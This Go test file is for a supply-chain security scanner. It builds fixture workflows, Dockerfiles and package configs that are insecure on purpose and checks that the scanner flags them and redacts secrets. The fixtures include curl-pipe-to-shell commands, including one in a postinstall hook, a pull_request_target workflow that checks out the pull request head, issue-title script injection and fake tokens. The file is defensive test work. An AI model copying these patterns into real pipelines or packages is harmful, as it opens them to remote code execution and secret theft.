package supply

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/zonicisalive/pulp/internal/check"
	"github.com/zonicisalive/pulp/internal/finding"
)

func tree(t *testing.T, files map[string]string) string {
	t.Helper()
	d := t.TempDir()
	for n, b := range files {
		p := filepath.Join(d, n)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(b), 0o600)
	}
	return d
}

func run(t *testing.T, c check.Check, d string) []finding.Finding {
	t.Helper()
	got, err := c.Run(context.Background(), check.Env{Root: d})
	if err != nil {
		t.Fatal(err)
	}
	return got
}

func titles(f []finding.Finding) string {
	var s []string
	for _, x := range f {
		s = append(s, x.Severity.String()+":"+x.Title)
	}
	return strings.Join(s, "\n")
}

func TestActions(t *testing.T) {
	sha := strings.Repeat("a", 40)
	d := tree(t, map[string]string{
		".github/workflows/ci.yml": `on: pull_request_target
permissions: write-all
jobs:
  b:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: actions/setup-node@` + sha + `
      - uses: someone/tool@v1
      - uses: ./local-action
      - uses: docker://alpine:3
      - run: echo "${{ github.event.issue.title }}"
      - name: ok
        env:
          TITLE: ${{ github.event.issue.title }}
        run: echo "$TITLE"
      - run: |
          echo ${{ github.head_ref }}
      - run: curl -s https://x.sh | bash
      - run: echo ${{ secrets.TOKEN }}
`,
		"docs/not-a-workflow.yml": "permissions: write-all\n",
	})
	got := run(t, actions{}, d)
	// write-all, pwn request, checkout@v4 (low), someone/tool@v1 (med), inline injection, block injection, curl|bash, echo secret
	if len(got) != 8 {
		t.Fatalf("want 8, got %d:\n%s", len(got), titles(got))
	}
}

func TestDockerfile(t *testing.T) {
	d := tree(t, map[string]string{
		"Dockerfile": `FROM node:latest AS build
RUN curl -sSL https://x/i.sh | sh
ENV API_TOKEN=abcd1234secret
ADD https://example.com/a.tar /a
FROM build
EXPOSE 22
`,
		"svc/Dockerfile": "FROM python:3.12-slim\nRUN pip install x\nUSER app\n",
		"x/Dockerfile":   "FROM scratch\nCOPY a /a\n",
	})
	got := run(t, dockerfile{}, d)
	// :latest, curl|sh, ENV secret, ADD url, EXPOSE 22, root final stage; clean svc and scratch produce root? scratch has no USER -> root finding too
	hasRootSvc := false
	for _, f := range got {
		if strings.HasPrefix(f.Location.Path, "svc") {
			hasRootSvc = true
		}
		if strings.Contains(f.Evidence, "abcd1234secret") {
			t.Error("ENV secret must be redacted")
		}
	}
	if hasRootSvc {
		t.Errorf("svc has USER app, must be clean:\n%s", titles(got))
	}
	if len(got) < 6 {
		t.Fatalf("want >=6, got %d:\n%s", len(got), titles(got))
	}
}

func TestPkgConfig(t *testing.T) {
	d := tree(t, map[string]string{
		".npmrc":                   "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnop1234\nregistry=http://r.example\nstrict-ssl=false\n_authToken=${NPM_TOKEN}\n",
		"requirements.txt":         "--index-url http://pypi.example/simple\n--trusted-host pypi.example\nrequests==2.0\n",
		"app/package.json":         `{"scripts":{"postinstall":"curl https://x | sh","build":"tsc"},"dependencies":{"a":"*","b":"1.0.0","c":"http://x/c.tgz"}}`,
		"locked/package.json":      `{"dependencies":{"a":"1.0.0"}}`,
		"locked/package-lock.json": "{}",
		"mono/pkg/package.json":    `{"dependencies":{"a":"1.0.0"}}`,
		"mono/package-lock.json":   "{}",
	})
	got := run(t, pkgConfig{}, d)
	// npmrc: token, http registry, strict-ssl (3); pip: index http, trusted-host (2);
	// app: postinstall, a:*, c:http, no lockfile (4)
	if len(got) != 9 {
		t.Fatalf("want 9, got %d:\n%s", len(got), titles(got))
	}
	for _, f := range got {
		if strings.Contains(f.Evidence, "npm_abcdefghijklmnop1234") {
			t.Error("npm token must be redacted")
		}
	}
}
